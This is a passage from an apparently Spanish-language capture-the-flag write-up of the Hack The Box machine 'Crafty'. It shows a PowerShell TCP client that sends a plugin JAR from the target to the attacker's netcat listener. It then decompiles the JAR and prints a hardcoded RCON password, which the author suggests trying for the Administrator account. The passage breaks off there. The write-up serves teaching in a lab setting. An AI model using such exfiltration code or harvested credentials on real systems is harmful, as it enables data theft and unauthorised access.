<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">+</span><span style="color:#393A34;--shiki-dark:#BABED8"> copy playercounter</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1.0</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">SNAPSHOT.jar \\</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10.10</span><span style="color:#393A34;--shiki-dark:#BABED8">.</span><span style="color:#2F798A;--shiki-dark:#F78C6C">14.92</span><span style="color:#393A34;--shiki-dark:#BABED8">\shell\playercounter.j ...</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">+</span><span style="color:#393A34;--shiki-dark:#BABED8"> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">    +</span><span style="color:#393A34;--shiki-dark:#BABED8"> CategoryInfo          : NotSpecified: </span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#BABED8">:</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> [</span><span style="color:#AB5959;--shiki-dark:#C792EA">Copy</span><span style="color:#999999;--shiki-dark:#89DDFF">-</span><span style="color:#AB5959;--shiki-dark:#C792EA">Item</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#AB5959;--shiki-dark:#89DDFF">,</span><span style="color:#393A34;--shiki-dark:#BABED8"> IOException</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">    +</span><span style="color:#393A34;--shiki-dark:#BABED8"> FullyQualifiedErrorId : System.IO.IOException</span><span style="color:#AB5959;--shiki-dark:#89DDFF">,</span><span style="color:#393A34;--shiki-dark:#BABED8">Microsoft.PowerShell.Commands.CopyItemCommand </span></span></code></pre> 
<p>Así que tendremos que usar otra forma de copiar este jar a nuestro ordenador, una de ellas es simplemente programando un poco en PowerShell para crear un cliente TCP y enviar el fichero a nuestro netcat que almacenará lo que reciba en un fichero.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">client</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#998418;--shiki-dark:#82AAFF"> New-Object</span><span style="color:#393A34;--shiki-dark:#BABED8"> System.Net.Sockets.TcpClient</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">client.Connect</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.14.92</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8443</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">stream</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#999999;--shiki-dark:#89DDFF"> $</span><span style="color:#B07D48;--shiki-dark:#BABED8">client.GetStream</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">bytes</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#999999;--shiki-dark:#89DDFF"> [</span><span style="color:#AB5959;--shiki-dark:#C792EA">System.IO.File</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span><span style="color:#393A34;--shiki-dark:#BABED8">::ReadAllBytes</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">plugins\playercounter-1.0-SNAPSHOT.jar</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">stream.Write</span><span style="color:#999999;--shiki-dark:#89DDFF">($</span><span style="color:#B07D48;--shiki-dark:#BABED8">bytes</span><span style="color:#AB5959;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#AB5959;--shiki-dark:#89DDFF">,</span><span style="color:#999999;--shiki-dark:#89DDFF"> $</span><span style="color:#B07D48;--shiki-dark:#BABED8">bytes.Length</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">$</span><span style="color:#B07D48;--shiki-dark:#BABED8">stream.Close</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">❯</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nc</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -lvnp</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8443</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playercounter.jar</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Listening</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.0</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8443</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Connection</span><span style="color:#B56959;--shiki-dark:#C3E88D"> received</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.11.249</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 49733</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">❯</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ls</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -la</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">total</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 63212</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  2</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">     4096</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 11</span><span style="color:#B56959;--shiki-dark:#C3E88D">:17</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">drwxr-xr-x</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 34</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">     4096</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:03</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ..</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">    11357</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Apr</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 20</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 23</span><span style="color:#B56959;--shiki-dark:#C3E88D">:07</span><span style="color:#B56959;--shiki-dark:#C3E88D"> LICENSE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">    38563</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:43</span><span style="color:#B56959;--shiki-dark:#C3E88D"> MinecraftClient.backup.ini</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">    38553</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:43</span><span style="color:#B56959;--shiki-dark:#C3E88D"> MinecraftClient.ini</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">    13280</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Apr</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 20</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 23</span><span style="color:#B56959;--shiki-dark:#C3E88D">:07</span><span style="color:#B56959;--shiki-dark:#C3E88D"> README.md</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rwxr-xr-x</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 64587949</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:35</span><span style="color:#B56959;--shiki-dark:#C3E88D"> mcli</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#B56959;--shiki-dark:#C3E88D"> vzon</span><span style="color:#2F798A;--shiki-dark:#F78C6C">     9996</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 11</span><span style="color:#B56959;--shiki-dark:#C3E88D">:10</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playercounter.jar</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">-rw-r--r--</span><span style="color:#2F798A;--shiki-dark:#F78C6C">  1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#B56959;--shiki-dark:#C3E88D"> root</span><span style="color:#2F798A;--shiki-dark:#F78C6C">      649</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Jun</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 17</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10</span><span style="color:#B56959;--shiki-dark:#C3E88D">:23</span><span style="color:#B56959;--shiki-dark:#C3E88D"> service</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">❯</span><span style="color:#B56959;--shiki-dark:#C3E88D"> file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> playercounter.jar</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">playercounter.jar:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Java</span><span style="color:#B56959;--shiki-dark:#C3E88D"> archive</span><span style="color:#B56959;--shiki-dark:#C3E88D"> data</span><span style="color:#393A34;--shiki-dark:#BABED8"> (JAR)</span></span></code></pre> 
<p>Ahora usemos un programa para descompilar el bytecode de este supuesto plugin, usaré JADX para esto.</p>
<p><img src="/src/assets/images/writeups/crafty/image-3.png" alt="alt text"/></p>
<p>Seleccionando el archivo en cuestión e inspeccionando sus clases, encontramos algo curioso en htb.crafty.playercounter.Playercounter.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">package</span><span style="color:#393A34;--shiki-dark:#C792EA"> htb</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">crafty</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">playercounter</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">import</span><span style="color:#393A34;--shiki-dark:#C792EA"> java</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">io</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">IOException</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">import</span><span style="color:#393A34;--shiki-dark:#C792EA"> java</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">io</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">PrintWriter</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">import</span><span style="color:#393A34;--shiki-dark:#C792EA"> net</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">kronos</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">rkon</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">core</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">Rcon</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">import</span><span style="color:#393A34;--shiki-dark:#C792EA"> net</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">kronos</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">rkon</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">core</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">ex</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">AuthenticationException</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#F78C6C">import</span><span style="color:#393A34;--shiki-dark:#C792EA"> org</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">bukkit</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">plugin</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">java</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#C792EA">JavaPlugin</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">/* loaded from: playercounter.jar:htb/crafty/playercounter/Playercounter.class */</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">public</span><span style="color:#AB5959;--shiki-dark:#C792EA"> final</span><span style="color:#AB5959;--shiki-dark:#C792EA"> class</span><span style="color:#2E8F82;--shiki-dark:#FFCB6B"> Playercounter</span><span style="color:#AB5959;--shiki-dark:#C792EA"> extends</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> JavaPlugin</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">    public</span><span style="color:#AB5959;--shiki-dark:#C792EA"> void</span><span style="color:#59873A;--shiki-dark:#82AAFF"> onEnable</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        try</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#C792EA">            Rcon</span><span style="color:#B07D48;--shiki-dark:#BABED8"> rcon</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> new</span><span style="color:#59873A;--shiki-dark:#82AAFF"> Rcon</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">127.0.0.1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 27015</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s67u84zKq8IXw</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#59873A;--shiki-dark:#82AAFF">getBytes</span><span style="color:#999999;--shiki-dark:#89DDFF">());</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">            try</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#C792EA">                String</span><span style="color:#B07D48;--shiki-dark:#BABED8"> result</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#B07D48;--shiki-dark:#BABED8"> rcon</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#59873A;--shiki-dark:#82AAFF">command</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">players online count</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#C792EA">                PrintWriter</span><span style="color:#B07D48;--shiki-dark:#BABED8"> writer</span><span style="color:#999999;--shiki-dark:#89DDFF"> =</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> new</span><span style="color:#59873A;--shiki-dark:#82AAFF"> PrintWriter</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">C:</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\\</span><span style="color:#B56959;--shiki-dark:#C3E88D">inetpub</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\\</span><span style="color:#B56959;--shiki-dark:#C3E88D">wwwroot</span><span style="color:#A65E2B;--shiki-dark:#BABED8">\\</span><span style="color:#B56959;--shiki-dark:#C3E88D">playercount.txt</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">UTF-8</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">                writer</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#59873A;--shiki-dark:#82AAFF">println</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#BABED8">result</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">            }</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> catch</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#393A34;--shiki-dark:#C792EA">IOException</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic"> e3</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">                throw</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> new</span><span style="color:#59873A;--shiki-dark:#82AAFF"> RuntimeException</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#BABED8">e3</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">            }</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        }</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> catch</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#393A34;--shiki-dark:#C792EA">IOException</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic"> e</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">            throw</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> new</span><span style="color:#59873A;--shiki-dark:#82AAFF"> RuntimeException</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#BABED8">e</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        }</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> catch</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#393A34;--shiki-dark:#C792EA">AuthenticationException</span><span style="color:#B07D48;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic"> e2</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">            throw</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> new</span><span style="color:#59873A;--shiki-dark:#82AAFF"> RuntimeException</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#393A34;--shiki-dark:#BABED8">e2</span><span style="color:#999999;--shiki-dark:#89DDFF">);</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">        }</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">    public</span><span style="color:#AB5959;--shiki-dark:#C792EA"> void</span><span style="color:#59873A;--shiki-dark:#82AAFF"> onDisable</span><span style="color:#999999;--shiki-dark:#89DDFF">()</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">    }</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">}</span></span></code></pre> 
<p>¡Una contraseña de texto plano para el RCON! Si lo intentamos en el sistema de vuelta no parece funcionar para el usuario actual, pero para el Administrador</p>
